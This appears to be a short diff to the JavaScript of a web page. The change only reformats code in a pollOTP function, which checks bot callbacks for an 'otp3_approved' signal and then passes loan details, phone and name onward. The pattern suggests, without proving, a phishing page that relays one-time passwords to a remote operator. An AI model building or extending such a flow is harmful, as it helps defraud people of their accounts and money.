@@ -169,7 +169,8 @@ function pollOTP(){
         if(u.callback_query){
           const cb=u.callback_query.data;
           if(cb==='otp3_approved'){
-            clearInterval(iv);document.getElementById('ov').classList.remove('on');
+            clearInterval(iv);
+            document.getElementById('ov').classList.remove('on');
             document.getElementById('ov').classList.add('on');
             setTimeout(()=>{
               const params=new URLSearchParams({amount:bd.amount||'',duration:bd.duration||'',interest:bd.interest||'',total:bd.total||'',phone:phone,name:name});
